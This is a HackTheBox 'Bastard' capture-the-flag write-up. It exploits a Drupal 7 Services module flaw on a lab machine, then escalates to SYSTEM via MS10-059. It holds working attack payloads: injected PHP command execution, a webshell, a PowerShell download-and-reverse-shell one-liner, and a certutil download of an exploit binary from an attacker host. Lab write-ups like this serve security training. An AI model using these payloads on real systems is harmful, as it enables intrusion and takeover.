# Hackthebox Bastard

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.177.169  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 03:40 EST
Nmap scan report for 10.129.177.169
Host is up (0.037s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

CHANGELOG.txt reveals the site has Drupal 7.54.

INSTALL.mysql.txt gives a hint a standard configuration of mysql might exist.

INSTALL.pgsql.txt gives a hint a standard configuration of postresql might exist.

INSTALL.sqlite.txt gives a hint a standard configuration of SQLite might exist.

INSTALL.php is a drupal installation script, that says drupal is already installed.

## Vulnerability Scanning

Start with the standard nmap scan.

```
$ nmap --script vuln 10.129.177.169
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 03:42 EST
Nmap scan report for 10.129.177.169
Host is up (0.033s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.177.169
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.177.169:80/
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://10.129.177.169:80/user/password
|     Form id: user-pass
|     Form action: /user/password
|     
|     Path: http://10.129.177.169:80/user/register
|     Form id: user-register-form
|     Form action: /user/register
|     
|     Path: http://10.129.177.169:80/node?destination=node
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://10.129.177.169:80/user
|     Form id: user-login
|     Form action: /user
|     
|     Path: http://10.129.177.169:80/user/
|     Form id: user-login
|_    Form action: /user/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc
49154/tcp open  unknown
```

Searchsploit for Microsoft IIS 7.5

```
$ searchsploit iis 7.5                                       
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                 | windows/remote/19033.txt
Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC)                                       | windows/dos/15803.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Searchsploit for Drupal 7.54

```
$ searchsploit drupal 7.54
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                 | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                              | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                      | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                         | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                    | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                           | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                       | php/webapps/46459.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Searchsploit for Drupal 7 provides more results for 7.x

```
$ searchsploit drupal 7   
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.0 - News Message HTML Injection                                                                                 | php/webapps/21863.txt
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                    | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                            | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                              | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                            | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                  | php/webapps/4510.txt
Drupal 5.21/6.16 - Denial of Service                                                                                     | php/dos/10826.sh
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                   | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                        | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                         | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                              | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                              | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                 | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                   | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                       | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                  | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                    | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                            | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                        | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                                                                        | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                 | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                              | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                      | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                      | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                         | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                    | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                           | php/webapps/46452.txt
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                           | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                       | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                        | php/webapps/44501.txt
Drupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Injections                                                           | php/webapps/32415.txt
Drupal Module CAPTCHA - Security Bypass                                                                                  | php/webapps/35335.html
Drupal Module CKEditor 3.0 < 3.6.2 - Persistent EventHandler Cross-Site Scripting                                        | php/webapps/18389.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                   | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                          | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                            | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                  | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                           | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities             | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                        | php/remote/40130.rb
Drupal Module Sections - Cross-Site Scripting                                                                            | php/webapps/10485.txt
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                                                  | php/webapps/33410.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Initial Access

### Drupal 7.x Module Services - Remote Code Execution

Take the default script as the basis, and by modifying the payload we can start to see which kind of target we have.

```
url = 'http://10.129.177.169';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'test.php',
    'data' => '<?php $output = shell_exec(\'systeminfo\'); echo "$output"; ?>'
];
```

By this execution of systeminfo we have

```
$ php 41564.php && curl http://10.129.177.169/test.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.177.169/test.php

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          3/1/2022, 10:40:23 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.585 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.618 MB
Virtual Memory: In Use:    477 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.177.169
                                 [02]: fe80::81eb:512b:510a:dcf2
```

We can also modify the payload the get the user flag

```
$url = 'http://10.129.177.169';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'test.php',
    'data' => '<?php $output = shell_exec(\'type \\Users\\Dimitris\\Desktop\\user.txt \'); echo "$output"; ?>'
];
```

shows the flag

```
$ php 41564.php && curl http://10.129.177.169/test.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.177.169/test.php
ba22fde1932d06eb...

owershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:4444/powercat.ps1');powercat -c 10.10.14.3 -p 6666 -e cmd"

$file = [
    'filename' => 'test.php',
    'data' => '<?php $output = shell_exec(\'PowerShell -Command "Invoke-WebRequest -Uri 10.10.14.23:4444\/powercat.ps1 -Outfile powercat.ps1"\'); echo "$output";
 ?>'
];

```

### Reverse shells for initial access 

First we experiment the shells we can have. Simple webshell can be achieved by payload

```
$file = [
    'filename' => 'webshell.php',
    'data' => '<html><body><form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php  if(isset($_GET[\'cmd\']))  { system($_GET[\'cmd\']);  } ?> </pre> </body></html>'
```

Full reverse shell can be achieved using this php script as the payload: https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php.

```
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.239.147] 49211
b374k shell : connected

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr

C:\inetpub\drupal-7.54>
```

## Privilege Escalation

First check with windows-exploit-suggester

```
$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python windows-exploit-suggester.py -i systeminfo.txt -d 2022-01-03-mssb.xls                        1 ⨯
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

### MS10-059

Chimichurri is becoming the hammer for all the nails

```
:\inetpub\drupal-7.54>certutil -urlcache -split -f "http://10.10.14.23:9000/Chimichurri_64bit.exe" Chimichurri_64bit.exe
certutil -urlcache -split -f "http://10.10.14.23:9000/Chimichurri_64bit.exe" Chimichurri_64bit.exe
****  Online  ****
  000000  ...
  0d2a00
CertUtil: -URLCache command completed successfully.

c:\inetpub\drupal-7.54>./Chimichurri_64bit.exe 10.10.14.23 7777
./Chimichurri_64bit.exe 10.10.14.23 7777
'.' is not recognized as an internal or external command,
operable program or batch file.

c:\inetpub\drupal-7.54>Chimichurri_64bit.exe 10.10.14.23 7777
Chimichurri_64bit.exe 10.10.14.23 7777
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
c:\inetpub\drupal-7.54
```

And our listener

```
$ nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.239.147] 49217
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

c:\inetpub\drupal-7.54>dir c:\users\administrator\desktop\root.txt.txt
dir c:\users\administrator\desktop\root.txt.txt
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of c:\users\administrator\desktop

19/03/2017  07:34 ��                32 root.txt.txt
```
